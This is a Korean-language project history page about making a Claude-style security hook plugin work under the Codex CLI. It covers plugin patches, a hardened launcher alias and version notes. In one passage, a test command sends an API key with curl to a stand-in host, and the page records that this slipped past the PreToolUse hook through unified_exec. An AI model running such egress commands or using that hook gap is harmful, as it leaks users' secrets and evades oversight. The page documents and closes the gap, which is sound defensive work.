# Codex native 기능 확인 이력

[상위 문서](codex-guard-compatibility.md)로 돌아간다. 아래는 원문의 해당 주제·당시 후보 기록을 순서대로 보존한 본문이다.

## Native Codex Capabilities

Codex에 보안·리뷰·훅 기능이 없다고 보면 안 된다. 2026-07-09 현재 설치본과 새로 받은 Codex manual 기준으로
다음이 확인됐다.

`codex features list`:

```text
guardian_approval                    stable             true
hooks                                stable             true
plugins                              stable             true
```

Codex manual은 Codex Security를 Codex용 security-review plugin으로 설명하고, 로컬 Codex thread에서 repository
scan과 code-change review를 수행하는 워크플로를 문서화한다. Auto-review도 별도 기능으로 존재하지만, 이는 권한
확대가 아니라 sandbox 경계에서 사람 승인 대신 별도 reviewer agent가 승인 요청을 검토하는 구조다.

2026-07-09 probe 당시 로컬 plugin 상태는 Codex native 보안 기능과 Claude plugin 호환 문제를 분리해서 봐야
함을 보여줬다.

```text
security-guidance@claude-plugins-official  installed, enabled  2.0.6
harness-guard@team-harness                 installed, enabled  0.35.2
codex-security@openai-curated              not installed
```

2026-07-10 05:41 KST에는 반복되는 invalid PostToolUse JSON 오류를 멈추기 위해 Codex 로컬 설정
(`~/.codex/config.toml`)에서 `security-guidance@claude-plugins-official`만 임시로 `enabled = false`로
바꿨고, `harness-guard@team-harness`는 `enabled = true`를 유지했다. 백업은
`/private/tmp/codex-config.backup.20260710054153.toml`에 있다.

이 임시 비활성화는 최종 상태가 아니다. 2026-07-10 후속 수정(v0.36.0)은
`plugins/harness-guard/scripts/codex-security-guidance-adapter.mjs`를 추가해 Claude
`security-guidance`가 내보내는 `metrics`/`rewakeSummary` 같은 Claude-only 필드를 Codex-safe 출력으로
정규화한다. 로컬 Codex 적용은
`plugins/harness-guard/scripts/patch-codex-security-guidance.mjs`가 수행한다: Codex의
`security-guidance@claude-plugins-official` 플러그인은 다시 `enabled = true`로 두고, 해당 플러그인의
Codex cache `hooks/hooks.json` command만 adapter 경유로 패치한다. Codex는 hook 정의의 현재 hash를 신뢰
상태로 기록하므로, command가 바뀐 뒤에는 새 hook hash를 `/hooks`에서 review/trust해야 실제 세션에서
실행된다. Claude Code 전역 설정은 바꾸지 않는다.

Codex 0.144.0은 Claude `type: "prompt"` hook을 아직 지원하지 않아 `harness-guard` 로드 때 해당 handler를
skip한다. v0.37.0의 `patch-codex-harness-guard.mjs`는 Codex local cache에서 그 unsupported handler만 제거하고,
구버전 cache의 YAML-invalid `argument-hint` scalar도 quote한다. `guard.sh`와 `route-intent.mjs` command hook은
그대로 유지하며, Claude가 읽는 원본 `hooks.json`과 SKILL source는 수정하지 않는다.

2026-07-10의 fresh `codex exec --ephemeral` (CLI 0.144.1) 반증 probe에서는 `unified_exec`가
`PreToolUse`를 발생시키지 않았다. `API_KEY=probe-secret curl -d "$API_KEY" https://example.invalid/collect`는
`UserPromptSubmit`만 거친 뒤 DNS 실패까지 실행됐다. Codex 공식 Hooks 문서도 `PreToolUse`가 현재 simple shell
호출만 intercept하며 `unified_exec` interception은 incomplete라고 명시한다. 그러므로 이 경로에서는
`harness-guard`의 command hook을 Claude와 동등한 secret-egress enforcement로 주장할 수 없다(#283).
후속 재검증에서 `codex exec`는 전역 `approval_policy = "untrusted"`와 달리 `approval: never`로 표시됐다.
따라서 non-interactive exec에 사람 승인 경계가 있다고 주장하지 않는다. v0.49.0 hardened CLI launcher는
`--disable unified_exec`를 주입하며, fresh ephemeral `pwd` probe에서 실제 `PreToolUse` 발화를 확인했다.
v0.55.0은 공식 admin-enforced system requirements에 `unified_exec=false`, `hooks=true`를 pin하는 installer를
추가해 launcher 밖의 일반 CLI·cmux·Desktop도 같은 simple-shell hook 경로를 사용하게 한다. launcher flag는
cache 자동복구와 하위 버전 방어를 위해 중복 유지한다.

Conclusion: Codex에서 보안 리뷰를 원하면 `security-guidance@claude-plugins-official`을 그대로 신뢰하지 말고
Codex Security plugin, Auto-review, sandbox/permissions/rules를 Codex native 경계로 검토해야 한다.
`security-guidance`의 현재 오류는 Codex 기능 부재가 아니라 Claude Code hook/output 계약을 Codex에 그대로 가져온
호환성 문제로 분류한다.

2026-07-23 Codex 0.144.6 재검증에서는 unified exec가 `PreToolUse` command hook을 지원한다. v0.61.0부터
`harness-guard`는 `.codex-plugin/plugin.json`, `codex/hooks/hooks.json`, `codex/skills/*/SKILL.md`를 source에
직접 제공한다. harness plugin cache patch, overlay 주입, custom agent 복사, unified exec 강제 비활성화는
제거했다. 위 0.144.0~0.144.1 기록은 당시 한계의 이력이며 현재 설치 절차가 아니다.


## 2026-10-09 이전 launcher·adapter 결합 안내 (대체됨)

아래는 현대화 전 안내 원문이다. 현행 launcher의 외부 patch 제거와 명시적 `--dry-run`/`--apply` 계약이 위 경로를 대체했다. 이 문단은 당시 명령·권한 안내의 이력이며 현재 실행 지시가 아니다.

`security-guidance` adapter patch는 외부 plugin cache와 marketplace snapshot 및 활성화 설정을 바꾸는 별도 작업이다. 이 변경까지 명시적으로 승인된 환경에서만 기존 patch/launcher를 사용한다. Team Harness 갱신에 필수로 묶지 않는다.

### CLI 자동 복구 launcher

외부 `security-guidance` 수정까지 승인된 기존 cmux 환경은 `scripts/codex-hardened.sh`를 선택할 수 있다. 이 launcher는 시작 직전에
source manifest가 설치 plugin보다 새로울 때만 공식 Codex CLI로 `team-harness` marketplace와
`harness-guard` plugin을 갱신한다. 이어서 native 계약 검사와 `security-guidance` adapter patch를 순서대로
적용하며, 동기화나 검사가 하나라도 실패하면 Codex를 실행하지 않는다. 버전이 같거나 설치본이 더 새로우면
marketplace 네트워크 호출을 생략한다. `approval_policy = "untrusted"`는 변경하지 않는다.

현재 checkout을 최신 `develop`으로 갱신한 뒤, zsh에서 다음 alias를 명시적으로 설치할 수 있다.

```zsh
alias codex='bash "$HOME/team-harness/scripts/codex-hardened.sh"'
```

영구 설치는 `.zshrc`에 같은 alias를 넣고 새 shell을 열어 확인한다. 제거하려면 해당 alias 한 줄만 지운다.
Desktop은 launcher를 실행하지 않으므로 plugin 갱신 뒤 doctor로 native 상태를 별도 확인한다.
hook 활성화는 system requirements가 launcher와 독립적으로 강제한다.


## 이전 adapter 설치 matrix 행 (2026-10-09 대체됨)

현행 표는 optional·명시 승인 계약을 따르며, 이전 상태 표기는 아래 그대로 보존한다.

| 소유 surface | Claude Code 경로 | Codex 경로 | 상태 | 자동 검증 |
|---|---|---|---|---|
| `scripts/patch-codex-security-guidance.mjs` | 해당 없음 | cache command patch + enable | Codex-native 설치 절차 | adapter patch test |
